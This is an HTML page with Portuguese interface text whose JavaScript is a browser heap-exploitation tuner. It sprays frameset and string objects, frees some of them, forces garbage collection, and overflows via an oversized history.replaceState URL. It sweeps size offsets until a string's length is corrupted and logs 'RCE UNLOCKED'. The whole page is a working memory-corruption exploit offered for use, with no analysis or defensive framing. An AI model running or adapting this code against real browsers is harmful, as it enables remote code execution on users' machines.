<!DOCTYPE html>
<html>
<head>
    <title>Auto-Forward Tuner (1MB+)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-top: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .data { color: yellow; }
    </style>
</head>
<body>

    <h1>Auto-Forward Tuner</h1>
    <p>Aumentando a vítima automaticamente até alinhar o Header.</p>

    <button onclick="startAutoTuning()">INICIAR VARREDURA AUTOMÁTICA</button>
    <button onclick="stop()" style="border-color:red; color:red; margin-left: 10px;">PARAR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Base de 1MB
        const TARGET_SIZE = 1024 * 1024; 
        const BASE_PAYLOAD = TARGET_SIZE - 24; 

        var victims_fs = [];
        var victims_str = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'data' ? 'class="data"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startAutoTuning() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando varredura...");

            // Vamos testar de +0 até +512 bytes de aumento
            // Pulo de 8 em 8 bytes
            for (let extra = 0; extra <= 512; extra += 8) {
                if(!isRunning) break;

                // Tenta 2 vezes cada tamanho para evitar falso negativo por instabilidade
                let successInThisSize = false;

                for(let retry=0; retry<2; retry++) {
                    log(`--- TESTANDO: +${extra} Bytes (Tentativa ${retry+1}) ---`);
                    
                    let result = await runTest(extra);

                    if (result === "RCE") {
                        isRunning = false;
                        return; // VENCEU!
                    }
                    
                    if (result === "DATA") {
                        // Se acertou dados, não precisa tentar de novo nesse tamanho,
                        // já sabemos que precisamos empurrar mais.
                        successInThisSize = true;
                        break; 
                    }
                    
                    // Se deu MISS (nada), tenta mais uma vez antes de mudar o tamanho
                    await forceGC();
                }
                
                // Pausa visual
                await new Promise(r => setTimeout(r, 100));
            }
            log("Fim do range. Se não achou, o header está muito longe ou protegido.");
        }

        async function runTest(extraBytes) {
            try {
                let currentPayloadSize = BASE_PAYLOAD + extraBytes;
                
                // Calcula frameset
                const targetTotal = TARGET_SIZE + extraBytes;
                const fsElements = Math.floor(targetTotal / 8) - 2;
                const fsRows = ",".repeat(fsElements);

                // 1. Spray Frameset
                victims_fs = [];
                const SPRAY_COUNT = 60;
                
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = fsRows;
                    victims_fs.push(fset);
                }

                // 2. Swap (String TextDecoder)
                let rawBuffer = new Uint8Array(currentPayloadSize);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                victims_str = [];
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims_fs[i].rows = ""; 
                    victims_fs[i] = null;
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims_str.push(s);
                }

                await forceGC();

                // 3. Exploit
                let buffer = "A".repeat(BASE_OFFSET);
                buffer += "\x01".repeat(OVERFLOW_AMT);
                history.replaceState({}, "tuning", "/" + buffer);

                // 4. Checagem
                return checkCorruption(currentPayloadSize, extraBytes);

            } catch(e) {
                log("Erro (Ignorado): " + e.message);
                return "ERR";
            }
        }

        function checkCorruption(expectedLen, extra) {
            for(let i=0; i<victims_str.length; i++) {
                let s = victims_str[i];
                if(!s) continue;
                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com +${extra}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED: SIZE +${extra}!`);
                        return "RCE";
                    }

                    // SINAL (DADOS)
                    if (msg.charCodeAt(0) !== 66) {
                         log(`[SINAL] Dados atingidos com +${extra}.`, 'data');
                         return "DATA";
                    }
                } catch(e) {}
            }
            return "MISS";
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
